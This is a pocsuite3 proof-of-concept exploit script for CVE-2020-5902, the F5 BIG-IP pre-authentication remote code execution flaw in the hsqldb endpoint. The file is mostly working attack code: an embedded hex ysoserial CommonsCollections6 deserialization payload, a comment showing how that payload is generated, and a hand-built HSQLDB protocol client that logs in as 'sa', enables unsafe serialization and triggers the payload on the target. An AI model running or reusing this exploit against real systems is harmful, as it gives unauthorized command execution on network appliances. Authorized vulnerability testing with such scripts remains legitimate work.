#!/usr/bin/env python3
# coding: utf-8
from pocsuite3.api import Output, POCBase, register_poc, requests
from urllib.parse import urljoin, urlparse
import socket
import ssl
import binascii

class HsqldbPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['anonymous']
    vulDate = ''
    createDate = '2020-07-29'
    updateDate = '2020-07-29'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902']
    name = 'F5 BIG-IP hsqldb preauth RCE'
    appPowerLink = ''
    appName = 'F5 BIG-IP'
    appVersion = '11.6.5.1'
    vulType = 'rce'
    desc = '''In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.'''
    samples = ['']
    install_requires = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        endpoint = urljoin(self.url, '/hsqldb%0a')
        '''
        java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections6 "id" > nc.class
        xxd -p nc.class | xargs | sed -e 's/ //g' | dd conv=ucase 2>/dev/null > payload.hex
        '''
        payload = 'ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001B00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001B7371007E00137571007E001800000002707571007E001800000000740006696E766F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400026964740004657865637571007E001B0000000171007E00207371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878'

        hsql = Hsqldb()
        connected = hsql.connect(endpoint, 'sa', '')
        if connected:
            r1 = hsql.execute("call \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true')").decode()
            r2 = hsql.execute("call \"org.hsqldb.util.ScriptTool.main\"('" + payload +"');").decode()
            if 'true' in r1 and 'java.lang' in r2:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = endpoint
            pass
        else:
            print('connect failed')


        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerable')
        return output

class Hsqldb:
    _url = False
    _database_id = False
    _session_id = False
    _headers = {'User-Agent':None, 'Accept': None} 

    def _send(self, url, data):
        r = requests.post(url, data, headers=self._headers, verify=False)
        return r.content

    def int2hex(self, num, length=4):
        f = '{:0%dX}' % length
        return binascii.unhexlify(f.format(num)).decode('latin-1')

    def connect(self, url, username, password):
        data = '\x00\x00\x00\x22\x00\x01\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x53\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        resp = self._send(url, data)
        if resp:
            self._url = url
            self._database_id = resp[8:12].decode('utf8')
            self._session_id = resp[12:16].decode('utf8')
            return True
        return False

    def execute(self, cmd):
        body = '\x00\x01\x00\x0b' + self._database_id + self._session_id + '\x00\x00\x00\x00\x00\x00\x00\x00' + self.int2hex(len(cmd), 8) + cmd
        data = self.int2hex(len(body)+4, 8) + body
        resp = self._send(self._url, data)
        return resp
    pass

register_poc(HsqldbPOC)
